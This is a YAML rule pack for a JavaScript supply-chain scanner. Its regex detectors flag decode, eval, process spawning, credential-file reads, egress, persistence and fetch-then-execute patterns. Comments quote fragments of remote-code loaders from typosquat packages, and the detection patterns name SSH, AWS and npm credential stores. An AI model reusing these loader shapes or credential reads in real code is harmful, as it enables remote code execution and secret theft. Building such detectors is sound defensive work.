pack:
  id: cordon.capabilities.javascript
  version: 0.1.0
  license: Apache-2.0
  source: cordon-builtin
  description: >
    Capability primitives for JavaScript and TypeScript. These rules do not
    themselves assert wrongdoing. They label what a file is capable of, so that
    composite rules can reason about combinations, and so that the same
    combination can be scored differently depending on where it sits.

rules:
  # ---------------------------------------------------------------------
  # DECODE
  # ---------------------------------------------------------------------
  - id: CAP.JS.DECODE.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: decode
    title: Decodes encoded data
    message: >
      This file decodes base64 or percent-encoded data at runtime. Decoding is
      ordinary on its own; it matters in combination with execution, because
      that combination is how a payload stays invisible to review.
    remediation: >
      No action required for this signal alone. Review it if the same file also
      executes code or reaches the network.
    languages: [javascript, typescript]
    evidence_policy: masked
    # Measured over corpus/benign, not asserted. A primitive that
    # matched nothing benign would be a primitive that does not work.
    baseline_hits: 1
    match:
      kind: regex
      patterns:
        - '\batob\s*\('
        - 'Buffer\s*\.\s*from\s*\([^)]{0,200}?["'']base64["'']'
        - 'decodeURIComponent\s*\(\s*escape\s*\('
        - 'from\s*\(\s*["'']hex["'']\s*\)'
    tests:
      positive:
        - "const raw = atob(payload);"
        - "const buf = Buffer.from(data, 'base64');"
        - "const s = decodeURIComponent(escape(x));"
      negative:
        - "const s = decodeURIComponent(location.search);"
        - "const buf = Buffer.from('plain text');"

  # ---------------------------------------------------------------------
  # EXECUTE
  # ---------------------------------------------------------------------
  - id: CAP.JS.EXECUTE.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: execute
    title: Evaluates code from a string
    message: >
      This file turns a string into executable code. That is the mechanism every
      second-stage loader depends on, because code that does not exist until
      runtime cannot be read in a diff.
    remediation: >
      Replace dynamic evaluation with a direct call. If a plugin system genuinely
      requires it, restrict the input to a reviewed allowlist.
    languages: [javascript, typescript]
    references:
      - https://cwe.mitre.org/data/definitions/95.html
    match:
      kind: regex
      patterns:
        - '\beval\s*\('
        # `.constructor` between the name and the parenthesis, because
        # `Function.constructor` IS `Function` -- every function's constructor
        # is the `Function` constructor -- so `new Function.constructor(a, b)`
        # compiles and runs exactly what `new Function(a, b)` does while
        # matching neither the obvious pattern nor a reader's eye.
        #
        # `cookie-parseflow` 1.5.8 is built on it. Its `lib/initializeCaller.js`
        # decodes a base64 URL with `atob`, GETs it with `axios`, and runs the
        # response through `new Function.constructor("require", response)` --
        # handing the fetched text the `require` function. Cordon reported
        # nothing at all in that package: no execute primitive fired, so the
        # decode and the fetch had nothing to combine with. The same shape
        # appears across the `chai-*` and `cookie-*` typosquats of 2026.
        - '\bnew\s+Function\s*(?:\.\s*constructor\s*)?\('
        - '\bFunction\s*\.\s*constructor\s*\('
        - '\bvm\s*\.\s*run(?:InNewContext|InThisContext|InContext)\s*\('
        - '\bsetTimeout\s*\(\s*["'']'
    tests:
      positive:
        - "eval(decoded);"
        - "const fn = new Function('a', 'return a');"
        - "const handler = new Function.constructor('require', response);"
        - "vm.runInNewContext(src, sandbox);"
      negative:
        - "// eval is not used here"
        - "const evaluate = (x) => x * 2;"

  # ---------------------------------------------------------------------
  # SPAWN
  # ---------------------------------------------------------------------
  - id: CAP.JS.SPAWN.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: spawn
    title: Starts a process or invokes a shell
    message: >
      This file starts an external process. In application code that is
      sometimes legitimate; in a package's install or build script it is how
      arbitrary commands run on a developer's machine.
    remediation: >
      Confirm the command and its arguments are fixed rather than assembled from
      input. Prefer an explicit argument list over a shell string.
    languages: [javascript, typescript]
    match:
      kind: regex
      patterns:
        # The module being CALLED, not imported. An import is a declaration and the
        # call site matches on its own line -- `CherryHQ/cherry-studio` anchored a
        # `SUSPECT.DECODE_EXEC.001` finding on `import { execFile } from
        # 'node:child_process'`, the first line of the file, 200 lines from anything
        # it was paired with.
        - 'require\s*\(\s*["''](?:node:)?child_process["'']\s*\)\s*\.\s*\w{1,20}\s*\('
        # The unambiguous names, which mean one thing in JavaScript.
        - '\b(?:execSync|spawnSync|execFileSync|execFile|fork)\s{0,4}\('
        # `exec` and `spawn` are NOT unambiguous, and the bare spelling was the
        # single noisiest pattern in this pack. `RegExp.prototype.exec` is how every
        # JavaScript file in the world matches a regular expression:
        #
        #     const match = /^data:([^,]*),([\s\S]*)$/.exec(String(dataUrl))
        #     const match = DATA_URL_RE.exec(dataUrl.trim())
        #
        # `NousResearch/hermes-agent` supplied five of those, each paired with a
        # base64 decode elsewhere in the file and reported as
        # `SUSPECT.DECODE_EXEC.001` -- "decoded data is executed" -- about a data-URL
        # parser. Every TypeScript codebase that parses a data URL has the shape.
        #
        # So: unqualified (the destructured import, `const { exec } = ...`), or
        # qualified by something that is plainly the process module. A receiver named
        # anything else is matched by the `require`/`import` lines above, which is how
        # the capability is still found when the call is written `childProc.exec(...)`.
        - '(?<![.\w$])(?:exec|spawn)\s{0,4}\('
        - '\b(?:child_process|childProcess|child|cp|cproc|proc|subprocess|shell)\s{0,4}\.\s{0,4}(?:exec|spawn)\s{0,4}\('
    tests:
      positive:
        - "require('child_process').exec(cmd);"
        - "execSync('npm run build');"
        - "exec('rm -rf /tmp/x');"
        - "child_process.exec(cmd);"
      negative:
        - "runner.execute(task);"
        - "await queue.spawnWorker();"
        # The regex shapes. Both were findings.
        - "const match = /^data:([^,]*),(.*)$/.exec(String(dataUrl));"
        - "const m = DATA_URL_RE.exec(dataUrl.trim());"
        # An import, which declares nothing about where the call is.
        - "import { execFile } from 'node:child_process'"
        - "const cp = require('child_process');"

  # ---------------------------------------------------------------------
  # CREDENTIAL
  # ---------------------------------------------------------------------
  - id: CAP.JS.CREDENTIAL.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: medium
    capability: credential
    title: Reads credentials or the environment
    message: >
      This file reads environment variables, registry credentials or key
      material. Reading configuration from the environment is normal; reading
      the environment wholesale, or reaching into credential files, is not.
    remediation: >
      Read named variables rather than serialising the whole environment, and
      never read another tool's credential file.
    languages: [javascript, typescript]
    evidence_policy: hash_only
    match:
      kind: regex
      patterns:
        - 'JSON\s*\.\s*stringify\s*\(\s*process\s*\.\s*env'
        # `process.env` anywhere in the argument list, not only as the sole
        # argument. `Object.assign({}, process.env, extra)` is the ordinary way
        # to copy the environment and the anchored form missed all of it.
        - 'Object\s*\.\s*(?:keys|values|entries|assign)\s*\([^)]{0,120}process\s*\.\s*env\b'
        # The SPREAD is deliberately absent, and it used to be here.
        #
        # `{ ...process.env, FOO: undefined }` is how every Node program builds an
        # environment to hand a child process. `esbuild` -- one of the most
        # installed packages there is -- writes exactly
        # `const env = { ...process.env, npm_config_global: void 0 };` in its
        # postinstall, and downloads its own platform binary from
        # `registry.npmjs.org` a few lines later. Install hook, plus "credential",
        # plus egress is `MALWARE.EXFIL.001`: "install script reads credentials and
        # transmits them", at CRITICAL, about a build fetching its own binary.
        #
        # Reading the environment to pass it on is not serialising it to send. The
        # patterns above cover the shapes that ARE that -- `JSON.stringify`,
        # `Object.entries`, `Object.assign` -- and the two below cover the
        # form-encoders, which is what the spread was reaching for and catching a
        # thousand innocent child processes on the way.
        - '(?:qs|querystring)\s*\.\s*stringify\s*\(\s*(?:\{\s*\.\.\.\s*)?process\s*\.\s*env\b'
        - '\bnew\s+URLSearchParams\s*\(\s*(?:\{\s*\.\.\.\s*)?process\s*\.\s*env\b'
        - '\.npmrc\b'
        - '\.ssh/|id_rsa|id_ed25519'
        - '\.aws/credentials|\.config/gcloud|\.kube/config'
        - '\bprocess\s*\.\s*env\s*\.\s*(?:NPM_TOKEN|GITHUB_TOKEN|AWS_SECRET_ACCESS_KEY)'
    tests:
      positive:
        - "const all = JSON.stringify(process.env);"
        - "const keys = Object.keys(process.env);"
        - "fs.readFileSync(os.homedir() + '/.npmrc');"
      negative:
        - "const port = process.env.PORT || 3000;"
        - "if (process.env.NODE_ENV === 'production') {}"

  # ---------------------------------------------------------------------
  # EGRESS
  # ---------------------------------------------------------------------
  - id: CAP.JS.PUBLISH.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: spawn
    title: Publishes packages to a registry
    message: >
      This file runs a package-publishing command. A release script does this;
      a published library does not, because by the time anybody is running the
      library the release has already happened.
    remediation: >
      Publishing belongs in release tooling, not in shipped code. If this file
      is part of a release pipeline it is in the wrong place.
    languages: [javascript, typescript]
    match:
      kind: regex
      patterns:
        # The command has to BEGIN the string, or follow a shell separator inside
        # it. Anything looser reads prose: `console.log('next: npm publish')` is
        # advice to a human, and the rule's own negative test caught it.
        #
        # And the string has to be PASSED or BOUND -- an open paren or an equals
        # before it. A command name is not a command until something runs it,
        # and the punctuation is where the difference shows: `exec('npm
        # publish')` runs it and `cmd = 'npm publish'` is about to, while
        # `['npm publish', 'git push']` is a list of names. Both of
        # `ruvnet/ruflo`'s hits were the third, in files whose subject is
        # warning a user about risky commands -- `RISKY_COMMANDS` and
        # `mediumRisk` -- so the composite above reported a registry worm in a
        # linter.
        #
        # `=` and not just `(` because malware does assign first, and a rule
        # that only reads the inline form would trade two false positives for
        # a whole shape. An array element is neither: `= [` puts a bracket
        # between the equals and the quote, and every later element follows a
        # comma.
        - '[=(]\s*["''`]\s*(?:[^"''`\n]{0,60}(?:&&|\|\||;)\s*)?(?:npm|yarn|pnpm)\s+publish\b'
        - '[=(]\s*["''`]\s*(?:[^"''`\n]{0,60}(?:&&|\|\||;)\s*)?npm\s+(?:adduser|login|token\s+create)\b'
    tests:
      positive:
        - "exec('npm publish --access public')"
        - "execSync(`yarn publish --new-version ${v}`)"
      negative:
        - "// run npm publish when you are ready"
        - "console.log('next: npm publish')"
        - "throw new Error('you must npm publish first')"

  - id: CAP.JS.RECON.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: reconnaissance
    title: Identifies the machine it is running on
    message: >
      This file reads the hostname, the user account or the home directory.
      Ordinary in diagnostics and in anything that reports its own environment;
      it matters when the same file sends it somewhere, and it matters a great
      deal when the file is a package that was just installed.
    remediation: >
      No action required for this signal alone. Review it if the same file also
      reaches the network.
    languages: [javascript, typescript]
    match:
      kind: regex
      patterns:
        - '\bos\s*\.\s*(?:hostname|userInfo|homedir|networkInterfaces)\s*\('
        - '\bprocess\s*\.\s*env\s*(?:\.\s*|\[\s*["''])(?:USERNAME|COMPUTERNAME|USERPROFILE|USERDOMAIN|HOSTNAME|LOGNAME)\b'
        # `os.platform()`, `os.arch()` and `process.cwd()` are deliberately absent.
        # Every bundler, test runner and postinstall build step in the ecosystem
        # calls them, and they say what kind of machine this is rather than which
        # one -- which is the distinction the primitive is about.
    tests:
      positive:
        - "const h = os.hostname();"
        - "const who = os.userInfo().username;"
        - "const name = process.env.COMPUTERNAME;"
      negative:
        - "const p = os.platform();"
        - "const cwd = process.cwd();"
        - "const node = process.env.NODE_ENV;"

  - id: CAP.JS.EGRESS.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: medium
    capability: egress
    title: Opens an outbound network connection
    message: >
      This file makes an outbound request. Expected in application code, and
      not expected at all in an install or build script.
    remediation: >
      Confirm the destination is a fixed, known host rather than one assembled
      at runtime.
    languages: [javascript, typescript]
    # Measured over corpus/benign, not asserted. A primitive that
    # matched nothing benign would be a primitive that does not work.
    baseline_hits: 2
    match:
      kind: regex
      patterns:
        - '\bfetch\s*\('
        - '\baxios\s*\.\s*(?:get|post|put|patch|request)\s*\('
        - '\bnew\s+XMLHttpRequest\s*\('
        - '\bnavigator\s*\.\s*sendBeacon\s*\('
        - 'require\s*\(\s*["'']https?["'']\s*\)'
        - '\bnet\s*\.\s*(?:connect|createConnection)\s*\('
    tests:
      positive:
        - "await fetch(endpoint, { method: 'POST' });"
        - "navigator.sendBeacon(url, payload);"
        - "const http = require('https');"
      negative:
        - "const data = await loadFromCache(key);"
        - "// fetch the record from the database"

  # ---------------------------------------------------------------------
  # PERSIST
  # ---------------------------------------------------------------------
  - id: CAP.JS.PERSIST.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: medium
    capability: persist
    title: Writes to a location that survives a restart
    message: >
      This file writes to a shell profile, a scheduled task or a service
      definition. These are the standard footholds for code that wants to run
      again after the process that installed it has exited.
    remediation: >
      Confirm this is an intentional installer action, and that the content
      written is fixed rather than fetched.
    languages: [javascript, typescript]
    match:
      kind: regex
      patterns:
        - '\.bashrc|\.bash_profile|\.zshrc'
        # `.profile` needs a path in front of it. Every JavaScript object with a
        # `profile` field is written `payload.profile`, and the bare form matched all
        # of them: `NousResearch/hermes-agent` reported three React components as
        # persistence mechanisms, one of them for `setConsoleProfile(frame.profile)`.
        #
        # The same reasoning the credential-store rule records for `Cookies`: a bare
        # word that is also a field name needs a separator or a quote.
        # And the name has to END there. `\b` is satisfied by a hyphen, so a CSS class
        # matched: `forem` reads `document.querySelector('.profile-header__details')`
        # and was reported as writing to a shell profile.
        - '[/~"''`]\.profile(?![\w-])'
        - 'crontab\b|/etc/cron'
        - 'LaunchAgents|LaunchDaemons'
        # `systemd/system` and `systemd/user`, and NOT a bare `.service`. Angular names
        # every file in a codebase `x.service.ts`, and they are imported with a path in
        # front of them, so no separator test can save that one: `Eugeny/tabby`
        # anchored a persistence finding on
        # `import { NotificationsService } from './notifications.service'`.
        #
        # Writing a unit means writing into one of these directories, which is what
        # the remaining alternative matches.
        - 'systemd[/\\](?:system|user)'
        - 'CurrentVersion\\\\Run'
    tests:
      positive:
        - "fs.appendFileSync(home + '/.bashrc', line);"
        - "execSync('crontab -l | ...');"
      negative:
        - "const profile = await loadUserProfile(id);"
        - "logger.info('service started');"

  # ---------------------------------------------------------------------
  # Fetch-execute adjacency
  # ---------------------------------------------------------------------
  - id: CAP.JS.FETCH_EXEC.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: fetch_exec
    title: Downloaded content is executed directly
    message: >
      The result of a network read is handed straight to an interpreter. Unlike
      a file that happens to fetch something and separately run something, this
      is one expression whose output is the other's input: what runs is whatever
      the remote host served at that moment, captured by no review and no
      lockfile.
    remediation: >
      Read the response into a variable, verify it against a known digest, and
      execute it as a separate step a reader can see.
    languages: [javascript, typescript]
    baseline_hits: 0
    match:
      kind: regex
      patterns:
        - '\beval\s{0,4}\(\s{0,4}(?:await\s{1,4})?(?:[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}){0,4}(?:fetch|get|request|axios)\b'
        - '\b(?:fetch|axios|https?\.get)\b[^;\n]{0,200}\.\s{0,4}then\s{0,4}\(\s{0,4}[^)\n]{0,60}=>\s{0,4}eval\s{0,4}\('
        # And the `await` form, where the response lands in a variable first and
        # the evaluator is the next statement but one. Same act, written the way
        # anybody writes asynchronous code now:
        #
        #     const s = (await axios.get(src, { headers: { [k]: v } })).data.config;
        #     const handler = new Function.constructor("require", s);
        #     handler(require);
        #
        # That is `chai-smart-assert` 1.1.5, and `chai-chain-test`, and
        # `chain-async-test`, and the rest of a family of typosquats published
        # through 2026. Cordon reported nothing in any of them, and the reason
        # was precise rather than accidental: `SUSPECT.DROPPER.001` requires a
        # third signal beyond egress and execute, because `egress AND execute`
        # on its own describes every deploy script ever written. The three
        # signals it accepts are a decode, an install hook, or this primitive --
        # and these packages have none of the first two. Their URL is in plain
        # text, so nothing decodes, and the payload runs on `require`, not on
        # install.
        #
        # Two hundred characters between the fetch and the evaluator, which is
        # room for the two lines above and not much else.
        - '\b(?:fetch|axios|https?\s{0,4}\.\s{0,4}get)\s{0,4}(?:\.\s{0,4}(?:get|post|request)\s{0,4})?\([^;]{0,200}[\s\S]{0,200}?\b(?:eval|new\s{1,4}Function\s{0,4}(?:\.\s{0,4}constructor\s{0,4})?)\s{0,4}\('
        # The same shape with a BLOCK body, and with `new Function` as well as
        # `eval`. The pattern above requires the evaluator to be the first thing
        # in the arrow, which only matches the one-expression form.
        #
        # `pretty-chalk` is the measured case and is two lines:
        #
        #     axios.get(decoder.decode(uint8Array))
        #       .then(response => { new Function("require", response.data.model)(require) })
        #
        # Download code, run code. Both primitives fired -- `axios.get` as egress,
        # `new Function` as execute -- and `SUSPECT.DROPPER.001` needs a third
        # signal saying the thing executed IS the thing fetched, which is what
        # this primitive is for. Without it the package reported nothing at all.
        - '\b(?:fetch|axios(?:\s{0,4}\.\s{0,4}\w{1,10})?|https?\s{0,4}\.\s{0,4}get)\s{0,4}\([^;]{0,200}\)\s{0,4}\.\s{0,4}then\s{0,4}\([^)\n]{0,60}=>[\s\S]{0,200}?(?:eval|new\s{1,4}Function)\s{0,4}\('
        - '\bnew\s{1,4}Function\s{0,4}\(\s{0,4}(?:await\s{1,4})?(?:[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}){0,4}(?:fetch|get|request)\b'
        - '\bchild_process\s{0,4}\.\s{0,4}exec\w{0,8}\s{0,4}\(\s{0,4}(?:await\s{1,4})?[^)\n]{0,80}\b(?:fetch|axios|request)\b'
    tests:
      positive:
        - "eval(await fetch(url).then(r => r.text()))"
        - "new Function(await fetch(u))()"
        - "fetch(u).then(r => eval(r))"
      negative:
        - "const data = await fetch(url); render(data)"
        - "eval(localConfig)"
        - "child_process.exec('ls -la')"

  - id: CAP.JS.DECOMPRESS.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: decompress
    title: Expands a compressed stream
    message: >
      This file inflates compressed data at runtime. Ordinary on its own -- a gzip stream is how a release is shipped -- and it matters when what comes out is then executed, which is a payload arriving in a form no pattern can read.
    remediation: >
      No action required for this signal alone. It matters in combination --
      with execution, or with a fetch whose output it reads.
    languages: [javascript, typescript]
    match:
      kind: regex
      patterns:
        - '\bzlib\s*\.\s*(?:gunzip|inflate|unzip|brotliDecompress)(?:Sync)?\s*\('
        - '\bcreateGunzip\s*\(|\bcreateInflate\s*\(|\bcreateBrotliDecompress\s*\('
        - '\bDecompressionStream\s*\('
    tests:
      positive:
        - "const out = zlib.gunzipSync(buf);"
        - "stream.pipe(createGunzip())"
      negative:
        - "zlib.gzipSync(buf)"
        - "JSON.parse(text)"

  - id: CAP.JS.DESERIALIZE.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: deserialize
    title: Turns a serialised byte stream back into live objects
    message: >
      This file deserialises data into objects. The stream carries the class names, so constructing them runs code the caller never named: it is execution wearing a data format, which is why it is separated from decoding.
    remediation: >
      No action required for this signal alone. It matters in combination --
      with execution, or with a fetch whose output it reads.
    languages: [javascript, typescript]
    match:
      kind: regex
      patterns:
        - '\bv8\s*\.\s*deserialize\s*\('
        - '\brequire\s*\(\s*["\'](?:node-serialize|funcster|serialize-to-js|cryo)["\']'
        - '\bunserialize\s*\('
    tests:
      positive:
        - "const o = v8.deserialize(buf);"
        - "const s = require('node-serialize');"
      negative:
        - "JSON.parse(text)"
        - "structuredClone(obj)"
